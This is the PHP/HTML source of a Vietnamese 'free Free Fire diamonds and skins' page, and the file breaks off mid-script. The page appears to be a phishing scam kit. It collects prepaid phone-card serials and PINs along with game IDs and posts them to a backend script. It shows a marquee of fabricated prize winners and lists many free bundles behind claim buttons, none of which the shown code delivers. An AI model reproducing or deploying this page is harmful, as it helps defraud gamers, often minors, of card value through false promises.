<?php

include ('@BiSexy/connect.php');

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<!-- Primary Meta Tags -->
<title><?php echo $bs_nameweb; ?> | Trang nhận quà Freefire online lớn nhất Việt Nam Thử Vận May Nạp Thẻ Nhận Quà Cực Chất</title>
<meta name="title" content="Trang nhận quà Freefire lớn nhất Việt Nam">
<meta name="description" content="Nạp kim cương free fire giá rẻ bằng thẻ cào. Nạp thẻ game Free Fire, nạp kim cương game Free Fire, nhận code Freefire ,code Freefire">

<!-- Open Graph / Facebook -->
<meta property="og:type" content="website">
<meta property="og:url" content="<?php echo $bs_main_url; ?>/">
<meta property="og:title" content="<?php echo $bs_title; ?>">
<meta property="og:description" content="<?php echo $bs_desciption; ?>">
<meta property="og:image" content="<?php echo $bs_main_url; ?>/bisex/logo@2x.c05a558a.png">

<!-- Twitter -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<meta name="keywords" content="nạp thẻ, napthe.vn, nạp thẻ pubg, nạp thẻ free fire, nạp thẻ liên quân, nạp kim cương free fire, nạp uc pubg, nạp quân huy liên quân, pubgm qq com, pubg mobile, pubgm, tai game pubg, tải pubg trung quốc, pubg free, tải pubg miễn phí, tải pubg china, cách tải game pubg, tai pubg ve may tinh, cách tải pubg miễn phí, chơi pubg miễn phí, pubg mobile vn, pubg vn, shoppubg vn, pubg mobile việt nam, pubg phiên bản trung quốc, pubg mobile vng, pubg phiên bản minecraft, pubg phien ban moi, pubg việt nam, pubg mobile tencent, pubg mobile pc tencent, pubg mobile tencent pc, tải pubg mobile pc tencent, pubg mobile pc, pubg mobile trung quốc, pubg mobile lite, tải pubg mobile pc, pubg mobile china, tai pubg mobile, cách chơi pubg mobile trên pc, download pubg pc, cách chơi pubg mobile, tải pubg mobile cho pc, tải game pubg mobile, tải pubg mobile chplay, tải pubg mobile trên pc, tải pubg mobile lite, tải pubg mobile trung quốc, cách tải pubg mobile pc, download pubg mobile cho pc, tai game pubg pc, pubg mobile trang chủ, tải pubg lite, tải pubg giả lập, tải pubg mobile giả lập, PlayerUnknown's Battlegrounds Mobile, pubg mobi, pubg, bubg, free fire"/>

<meta property="twitter:card" content="summary_large_image">
<meta property="twitter:url" content="<?php echo $bs_main_url; ?>/">
<meta property="twitter:title" content="<?php echo $bs_title; ?>">
<meta property="twitter:description" content="<?php echo $bs_desciption; ?>">
<meta property="twitter:image" content="<?php echo $bs_main_url; ?>/logo@2x.c05a558a.png">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/css/bootstrap.css">
	<script type='text/javascript'>
//<![CDATA[
function loadCSS(e, t, n) { "use strict"; var i = window.document.createElement("link"); var o = t || window.document.getElementsByTagName("script")[0]; i.rel = "stylesheet"; i.href = e; i.media = "only x"; o.parentNode.insertBefore(i, o); setTimeout(function () { i.media = n || "all" }) }
loadCSS("https://use.fontawesome.com/releases/v5.6.3/css/all.css");loadCSS("https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700|Roboto+Condensed:300,400,700");
//]]>
</script>
<style>
    body{font-family:"Roboto",sans-serif;font-size:15px;margin:0;padding:0;color:#222;overflow-x:hidden;counter-reset:my-sec-counter;scroll-behavior: smooth}
    .kimcuong {
    display: inline-block;
    vertical-align: middle;
    height: 20px;
    margin: 0 5px 0 5px;
}
.-jAnE7PYpd-CGj_OmKM58 {
    float: left;
    width: 17px;
    height: 13px;
    margin-top: 4px;
    margin-right: 6px;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAANCAYAAABPeYUaAAAAAXNSR0IArs4c6QAAAIFJREFUKBWtkksOgCAMRFvupFu8hXpDvQVu8U5WhwQSmxh+dtNAeVOmwMspToQsVQQzHdvAU0RMrQDAFiY2/Mw8+0e3IfaRAwtrpoF/IbDWLQLFf0XgEao6Yy8X3YNFA4Pp5jrpumaCBX2oZL16sReRw9kk0vpfIJJeR18RxZIAdwNTJCm5AfqJlgAAAABJRU5ErkJggg==);
    background-size: 100% 100%;
}
.nav-pills .nav-link.active, .nav-pills .show>.nav-link {
    color: #dcdcdc;
    background-color: #ffffff;
    border: 1px solid #f00;
}
 .loading {
                background-color: #000000c4;
                top: 0;
                left: 0;
                position: fixed;
                width: 100%;
                height: 100%;
                z-index: 9998;
                display: none;
            }
            .lds-hourglass {
              display: inline-block;
              position: fixed;
              width: 64px;
              height: 64px;
              z-index: 9999;
              top: 45%;
              left: calc(50% - 32px);
            }
            .lds-hourglass:after {
              content: " ";
              display: block;
              border-radius: 50%;
              width: 0;
              height: 0;
              margin: 6px;
              box-sizing: border-box;
              border: 26px solid #fff;
              border-color: #fff transparent #fff transparent;
              animation: lds-hourglass 1.2s infinite;
            }
            @keyframes lds-hourglass {
              0% {
                transform: rotate(0);
                animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
              }
              50% {
                transform: rotate(900deg);
                animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
              }
              100% {
                transform: rotate(1800deg);
              }
            }
a {
    color: #f00;
    text-decoration: none;
    background-color: transparent;
    -webkit-text-decoration-skip: objects;
}
.bg-light {
    background-color: #ececec !important;
}
.nav-pills .nav-link.active, .nav-pills .show>.nav-link {
    color: #dcdcdc;
    background-color: #0000006e;
    border: none;
    border-radius: 0;
}
.nav-pills .nav-link {
    border-radius: 0;
    color: #7b7b7b;
    background: #00000026;
}
/* Ripple effect */
.ripple {
  background-position: center;
  transition: background 0.8s;
}

.ripple:active {
  background-color: #0000006e;
  background-size: 100%;
  transition: background 0s;
}
.icons{
     width: 100%;
     border-radius: 4px;
}
nhans{
        display: contents;
}
.targetDiv{
    display:none;
}
html {
  position: relative;
  min-height: 100%;
}
body {
  margin-bottom: 60px; /* Margin bottom by footer height */
}
.footer {
    position: absolute;
    bottom: 0;
    width: 100%;
    height: 60px;
    line-height: 60px;
    background-color: #4c4c4c;
}


/* Custom page CSS
-------------------------------------------------- */
/* Not required for template or sticky footer method. */

.container {
  width: auto;
  max-width: 680px;
  padding: 0 15px;
}
.foot-info {
	padding-top: 1rem;
	opacity: 0.8;
}

.foot-logo {
	opacity: 0.8;
}
</style>
<?php echo $bs_anticode; ?>
        <script>
                    function loading(show) {
    if(show == true)
        $('.loading').show();
    else
        $('.loading').hide();
}
        </script>

</head>
<body>
     <div class="loading"><div class="lds-hourglass"></div></div>

    <!-- Just an image -->
<nav class="navbar navbar-light bg-light">
  <a class="navbar-brand" href="#">
    <img src="<?php echo $bs_main_url; ?>/bisex/logo@2x.c05a558a.png" width="108" height="31" alt="Garena Free Fire">
    </a>
</nav>
</br>
   <div class="col"><a class="showSingle" target="1"><img src="https://i.imgur.com/QvItdpI.jpg" class="icons"></a></div>
<div class="col-md-12">
	</br>
       <marquee direction="left" height="20" onmouseout="this.start()" scrollamount="20" onmouseover="this.stop()"> 

                                    <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****670172</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">M1014 Long Tộc </b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****679252</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****319752</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Mãng Xà Nổi Loạn</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
  </b><b style="color: white;background-color: orange;display:inline-block">ID: ****642773</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói 3050 Kim Cương</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****8276192</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Lv7</b> 
        <li style="list-style:none;display:inline-block">
   <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****642134</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói M1014 Long Tộc </b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****9622194</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Lv7</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****196913</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Kim Cương</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
  </b><b style="color: white;background-color: orange;display:inline-block">ID: ****698373</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Quà Siêu Phẩm</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****3976112</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">GÓI QUỶ KIẾM DẠ XOA</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****9622864</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">SCAR CÁ MẬP ĐEN LV7</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****196633</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Kim Cương</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****91865</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Mp 40 Mãng Xà Vĩnh Viễn</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****7628911</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">MP40 BÍCH VÀNG</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****360016</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Mp 40 Mãng Xà Lv7</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****726778</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Thích Khách Kim Long</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****72771</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">Gói Quà Siêu Phẩm</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****663001</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">GÓI Mp 40 Mãng Xà Lv7</b> 
        <li style="list-style:none;display:inline-block">
  <b title="text" rel="dofollow" href="http://shopthaoxinh.com/" target="_self" style="color: blue; font-size: 15">[Chúc Mừng]</b>
</b><b style="color: white;background-color: orange;display:inline-block">ID: ****663001</b> 
        </li><li style="list-style:none;display:inline-block"style="color: black" >đã nhận được</li> 
        </b><b style="color: green;display:inline-block">GÓI QUỶ KIẾM DẠ XOA</b> 
        </marquee>
         <div class="alert alert-warning" role="alert">
<b>Nạp Kim Cương Free Fire Nhận Quà Cực Vip Lưu Ý: <b style="color:red"> Nhập Đúng Seri Mã Thẻ Để Nhận Quà Nếu Mã Thẻ Hoặc ID Sai Tài Khoản Sẽ Không Nhận Được Quà Và Kim Cương!</b>
</div></b>
</div></div>
    <div class="col-md-6">
        <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
  <li class="nav-item">
    <a class="nav-link active ripple" id="pills-home-tab" data-toggle="pill" href="#pills-home" role="tab" aria-controls="pills-home" aria-selected="true">Nạp Kim Cương</a>
  </li>
  <li class="nav-item">
    <a class="nav-link ripple" id="pills-kc-tab" data-toggle="pill" href="#pills-kc" role="tab" aria-controls="pills-kc" aria-selected="false">Nhận quà FreeFire</a>
  </li>
</ul>
                           <div class="tab-content" id="pills-tabContent">
  <div class="tab-pane fade show active" id="pills-home" role="tabpanel" aria-labelledby="pills-home-tab">
                    <div class="form-group">
                        <label>Loại thẻ:</label>
                        <select class="form-control" id="card_type">
                            <option value="">Chọn loại thẻ</option>
                            <option value="VIETTEL">Viettel</option>
                            <option value="MOBIFONE">Mobifone</option>
                            <option value="VINAPHONE">Vinaphone</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Mệnh giá:</label>
                        <select class="form-control" id="card_amount">
                             <option value="">Chọn mệnh giá</option>
                                           
                                            <option value="50000">50.000VND - Nạp KM 3200 Kim Cương </option>
                                             <option value="100000">100.000VND - Nhận Thêm Gói Quà</option>
                                             <option value="200000">200.000VND - Nhận Thêm Gói Quà</option>
                                             <option value="500000">500.000VND - Nhận Thêm Gói Quà</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Số seri:</label>
                        <input type="text" class="form-control" id="serial" placeholder="Nhập số seri trên thẻ" />
                    </div>
                    <div class="form-group">
                        <label>Mã thẻ:</label>
                        <input type="text" class="form-control" id="pin" placeholder="Nhập Mã Thẻ In Sau Lớp Bạc Mỏng " />
                    </div>
                    <div class="form-group">
                        <label>ID Game:</label>
                        <input type="text" class="form-control" id="idgame" placeholder="Nhập Chính Xác ID Game Cần Nạp Kim Cương " />
                    </div>
                    <div class="form-group"></div>
                    <div class="form-group">
                        <button type="submit" class="btn btn-danger btn-block" onclick="cmsntjzon(this)">NẠP KIM CƯƠNG</button>
                   </div>
                                </div>

                                <script>
                                    function cmsntjzon() {
                                        var card_type = $("#card_type").val();
                                        var card_amount = $("#card_amount").val();
                                        var serial = $("#serial").val();
                                        var pin = $("#pin").val();
                                        var idgame = $("#idgame").val();

                                        if (!card_type || !card_amount || !serial || !pin || !idgame) {
                                            swal("Có Lỗi Xảy Ra", "Vui Lòng Điền Đầy Đủ Thông Tin Bao Gồm Seri Mã Thẻ Và ID Game Của Bạn", "error");
                                        } else {
                                            $.ajax({
                                                type: "POST",
                                                url: "ajax.php",
                                                data: {
                                                    card_type,
                                                    card_amount,
                                                    serial,
                                                    pin,
                                                },
                                                dataType: "json",
                                                success: function (res) {
                                                    if (res.success) {
                                                        swal("Thành công", res.success, "success");
                                                    } else {
                                                        swal("Lỗi", res.error, "error");
                                                    }
                                                },
                                                error: function (err) {
                                                    console.log(err);
                                                },
                                            });
                                        }
                                    }
                                  </script>
	</button>
 <!-- <div class="tab-pane fade" id="pills-profile" role="tabpanel" aria-labelledby="pills-profile-tab">
      	<div class="form-group">
						<label>ID Game:</label>
						<input type="text" class="form-control" name="idgames" />
					</div>
      <div class="form-group">
						<label>Mệnh giá cần nạp:</label>
						<select class="form-control" onchange="SMS()" id="laysms">
							<option value="">Chọn mệnh giá</option>
							<option value="3">50.000</option>
							<option value="4">100.000</option>
							<option value="5">200.000</option>
							<option value="6">500.000</option>
						</select>
					</div>
					
        <div class="form-group">
            <div style="
    text-align: center;
" id="KETQUASMS">Vui lòng chọn mệnh giá.</div>
            </div>
            
            <small id="emailHelp" class="form-text text-muted">Chỉ cần chọn mệnh giá, hệ thống sẽ trả về lời nhắn kèm nội dung tin nhắn, chỉ cần soạn tin như hướng dẫn và gửi đi thì bạn sẽ nạp thành công kim cương (chỉ áp dụng sim Viettel).</small>
            <script>
            function SMS() {
  var id_sms = document.getElementById("laysms").value;
  loading(true);
  $('#KETQUASMS').load('ajax.php?PT=SMS&IDNAP=' + id_sms, function(){
            loading(false);
        });
  
}
</script>
  </div>-->
   <div class="tab-pane fade" id="pills-kc" role="tabpanel" aria-labelledby="pills-kc-tab">
       <div class="form-group">
	<br/>
				
    <br>
    	<div class="P3GwZUVZnA">
    	    <h4 class="shop text-center">
<script type="text/javascript" data-cfasync="false">
                    			farbbibliothek = new Array();
                    					farbbibliothek[0] = new Array("#824800","#824800","#824800","#824800","#824800","#925100","#a05900","#b56500","#c36d00","#d27703","#e48000","#ff8f00","#ff9209","#ffb900","#ffdc00","#ffb900","#ff9209","#e48000","#d27703","#c36d00","#b56500","#a05900","#925100","#824800","#824800","#824800","#824800","#824800");
                    					farbbibliothek[1] = new Array("#824800","#824800","#824800","#824800","#824800","#925100","#a05900","#b56500","#c36d00","#d27703","#e48000","#ff8f00","#ff9209","#ffb900","#ffdc00","#ffb900","#ff9209","#e48000","#d27703","#c36d00","#b56500","#a05900","#925100","#824800","#824800","#824800","#824800","#824800");
                    
                    					farben = farbbibliothek[0];
                    					function farbschrift()
                    					{
                    						for(var i=0 ; i<Buchstabe.length; i++)
                    						{
                    							document.all["a"+i].style.color=farben[i];
                    						}
                    						farbverlauf();
                    					}
                    					function string2array(text)
                    					{
                    						Buchstabe = new Array();
                    						while(farben.length<text.length)
                    						{
                    							farben = farben.concat(farben);
                    						}
                    						k=0;
                    						while(k<=text.length)
                    						{
                    							Buchstabe[k] = text.charAt(k); 
                    							k++;
                    						}
                    					}
                    					function divserzeugen()
                    					{
                    						for(var i=0 ; i<Buchstabe.length; i++)
                    						{
                    							document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "<\/span>");
                    						}
                    						farbschrift();
                    					}
                    					var a=1;
                    					function farbverlauf()
                    					{
                    						for(var i=0 ; i<farben.length; i++)
                    						{
                    							farben[i-1]=farben[i];
                    						}
                    						farben[farben.length-1]=farben[-1];
                    
                    						setTimeout("farbschrift()",60);
                    					}
                    //
                    var farbsatz=1;
                    function farbtauscher()
                    {
                    	farben = farbbibliothek[farbsatz];
                    	while(farben.length<text.length)
                    	{
                    		farben = farben.concat(farben);
                    	}
                    	farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
                    }
                    setInterval("farbtauscher()",60000);
                    
                    text= "QUÀ NẠP FREE FIRE"; //h
                    string2array(text);
                    divserzeugen();
                    </script></b></td>
</center></div></li>  
	</div>	
					
    	     <center></b></b></center></h3>
					<div class="form-group">
						<label>Nhập Chính Xác ID Game Để Nhận Gói Quà:</label>
						<input type="number" class="form-control" name="idgamess" placeholder="Nhập ID Game Để Nhận Gói Quà"/>
						</div>
                                        
				</div>
					<br/>
					</h3>					    <ul class="list-group">
						<li class="list-group-item d-flex justify-content-between align-items-center"><img src="https://lh5.googleusercontent.com/proxy/fZiUfSNaeYiXqEIlHL9KFgIiAN1gFDFgHIaAyoqAwfn_ua63LL3oI5N7-GuesW469gIOPFe5WDS5qxJJ9PTV4gYdwa9EuemwH1Uw7ZzoVEz-8-tyPM4pwDoGKGkFcC9XSOc6jWZUVFfadB607qWRl_MqzIiNz1zZ1BfJgXeNhoQfOlj462Np91pBWYDMPqrlE3MMcE9eg1Pry54WPQHhNQ=w1200-h630-p-k-no-nu" style="
    width: 20px;
    vertical-align: sub;
"/> 10.000 kim cương <img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b></td><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>M1014 Long Tộc Lv7 <img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;    
"/>AK Rồng Xanh LV7 <img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Scar Cá Mập Đen LV7 <img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif" /><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;   
"/>Mp40 Mãng Xà LV7<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b></td><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>M60 Thanh Long<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b></td><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub; 
"/>M60 Bạch Hổ<img src="https://shopbacgau.com/upload/userfiles/images/hot(6).gif"></b></td><span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;      
"/> Gói Quỷ Dạ Xoa<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;         
"/>Skin Mp40 Bích Vàng<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/> Skin Ak Hoả Kì Lân<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Skin P90 Chiến Ca Hổ Phách<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Skin M4A1 Thiết Quyền<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Skin M1887 Thánh Phồng<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Nắm Đấm Hoả Quyền<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Nắm Đấm Nhất Quyền<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Nắm Đấm Băng Quyền<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Ninja Hỏa Ngục<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;    
"/>Gói Học Ninja Bóng Đêm<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Học Ninja Hàn Băng<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub; 
"/>Gói Học Ninja Hào Quang<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;    
"/>Gói Học Viên Nham Thạch<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/> Gói Thợ Săn Không Gian<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub; 
"/> Gói Thánh Phồng <span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub; 
"/> Gói Dân Chơi Đường Phố<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub; 
"/>Gói Mỹ Nữ Phù Tang<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Ma Tốc Độ<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Thích Khách Kim Long <span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
  <li class="list-group-item d-flex justify-content-between align-items-center"><img src="@BS_vatpham/Gift-715x836.png" style="
    width: 20px;
    vertical-align: sub;
"/>Gói Thích Khách Hắc Long<span onclick="nhanqua()" class="badge badge-primary badge-pill">Nhận</span></li>
</ul>
<!-- CSS -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">

       <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
       <center> 
<script>
    function nhanquacode(){
                swal({
                              title: "Nhận Code Thất Bại",
